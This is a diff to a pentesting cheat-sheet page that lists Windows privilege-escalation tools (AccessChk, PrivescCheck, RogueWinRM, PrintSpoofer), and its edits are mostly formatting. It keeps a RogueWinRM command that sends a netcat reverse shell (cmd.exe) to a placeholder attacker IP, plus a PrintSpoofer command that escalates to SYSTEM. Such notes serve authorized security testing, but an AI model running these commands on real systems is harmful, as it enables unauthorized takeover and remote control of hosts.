@@ -5,18 +5,17 @@ description: Pentesting Tools Windows
 keywords: [accesschk, privesccheck, winpeass, winpeas, roguewinrm, printspoofer]
 ---
 
-## AccessChk
+### AccessChk
+
+- List Access of **(Users - Groups) to Files - Directories - Registry Keys - Global Objects - Windows Services**
 
 
 ```batch
 :: Accepts The Eula Before Executing
-accesschk.exe /accepteula
-
-:: List Access of (Users - Groups) to Files - Directories - Registry Keys - Global Objects - Windows Services
-accesschk64.exe -qlc <ServiceName>
+accesschk /accepteula
 ```
 
-## PrivescCheck
+### PrivescCheck
 
 - **`PrivescCheck`** is a <b style={{ color: 'MediumTurquoise' }}>PowerShell</b> Script that searches Common Privilege Escalation on the Target System.
 
@@ -26,11 +25,11 @@ PS C:\> . .\PrivescCheck.ps1
 PS C:\> Invoke-PrivescCheck
 ```
 
-## RogueWinRM
+### RogueWinRM
 
 :::danger Only Possible if **`WinRM`** Service Is Not Running
 
-**Default on `Windows 10` but Not on `Windows Server 2019`**
+**Default on `Windows 10` but Not on `Windows Server 2019`**.
 
 :::
 
@@ -39,13 +38,13 @@ PS C:\> Invoke-PrivescCheck
 
 
 ```batch
-RogueWinRM.exe -p "C:\Tools\nc64.exe" -a "-e cmd.exe <ATTACKER_IP> <PORT>"
+RogueWinRM -p "C:\Tools\nc64.exe" -a "-e cmd.exe <ATTACKER_IP> <PORT>"
 ```
 
-## PrintSpoofer
+### PrintSpoofer
 
 From **LOCAL/NETWORK SERVICE** to <b style={{ color: 'Red' }}>SYSTEM</b> by busing <b style={{ color: 'Brown' }}>[SeImpersonatePrivilege]</b>
 
 ```batch
-PrintSpoofer64.exe -i -c powershell
+PrintSpoofer64 -i -c powershell
 ```
